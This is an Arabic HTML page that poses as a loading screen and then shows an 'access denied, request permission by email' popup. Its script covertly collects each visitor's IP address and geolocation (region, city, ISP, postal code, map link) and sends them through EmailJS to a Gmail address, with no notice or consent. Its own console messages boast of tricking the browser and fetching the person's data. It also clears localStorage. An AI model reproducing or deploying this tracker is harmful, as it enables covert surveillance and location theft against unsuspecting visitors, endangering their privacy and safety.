<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>جارٍ التحميل...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
                Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            direction: rtl;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            user-select: none;
        }

        #popup {
            position: fixed;
            top: 0; right: 0; bottom: 0; left: 0;
            background: rgba(10, 10, 10, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease;
        }

        #popup.active {
            opacity: 1;
            pointer-events: all;
        }

        #popup > div {
            background: #121418;
            padding: 40px 35px;
            border-radius: 18px;
            box-shadow: 0 20px 60px rgba(20, 20, 30, 0.7);
            max-width: 400px;
            width: 90%;
            text-align: center;
            color: #f0f0f5;
            font-weight: 600;
            font-size: 1.15rem;
            letter-spacing: 0.04em;
            position: relative;
            transform: translateY(-30px);
            animation: popupIn 0.4s forwards cubic-bezier(0.23, 1, 0.32, 1);
            box-sizing: border-box;
            user-select: text;
        }

        #popup p {
            margin: 0.4em 0;
            font-weight: 600;
            line-height: 1.4;
            color: #f44336;
            text-shadow: 0 0 8px #f44336aa;
        }

        #popup p.email {
            color: #82aaff;
            font-weight: 700;
            font-family: 'SF Mono', Consolas, "Liberation Mono", Menlo, monospace;
            font-size: 1rem;
            margin-top: 15px;
            direction: ltr;
            user-select: all;
            cursor: text;
            text-shadow: 0 0 6px #82aaffcc;
        }

        @keyframes popupIn {
            0% {
                opacity: 0;
                transform: translateY(-30px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 480px) {
            #popup > div {
                padding: 30px 20px;
                font-size: 1rem;
                max-width: 90vw;
                border-radius: 14px;
            }
            #popup p.email {
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>

<div id="popup" role="alert" aria-live="assertive" aria-atomic="true">
    <div>
        <p>ليس مصرح لك بالدخول</p>
        <p>يمكنك طلب تصريح الان عبر</p>
        <p class="email" tabindex="0">enadalharbi@app.com
        </p>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
console.log("تم خداع المتصفح بنجاح");

window.onload = function () {
    console.log("يتم الان جلب بيانات الشخص");
    localStorage.clear();

    const popup = document.getElementById("popup");
    emailjs.init("GRpOF1pKqcSg9cx5H");

    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            console.log("IP:", data.ip);
            return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(res => res.json())
        .then(loc => {
            console.log("Location data from ipapi:", loc);

            let googleMapUrl = "تعذر توليد رابط الخريطة";

            if (loc.latitude && loc.longitude) {
                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            }

            const locationString = `
                المنطقة: ${loc.region || 'غير معروف'}
                المدينة: ${loc.city || 'غير معروف'}
                المحافظة: ${loc.county || 'غير معروف'}
                المزود: ${loc.org || 'غير معروف'}
                الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
                رابط الخريطة: ${googleMapUrl}
            `;

            console.log("Location string to send:", locationString);

            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                name: "تم جلب موقع شخص الان",
                time: new Date().toLocaleString('ar-EG'),
                message: locationString
            });
        })
        .then((response) => {
            console.log("Email sent successfully:", response.status, response.text);
        })
        .catch(err => {
            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
        })
        .finally(() => {
            if (popup) {
                popup.classList.add("active");  // إضافة الكلاس لظهور النافذة مع الأنيميشن
            }
        });
};

console.log("تم اتمام العملية بنجاح , EnnnadTools");
</script>

</body>
</html>
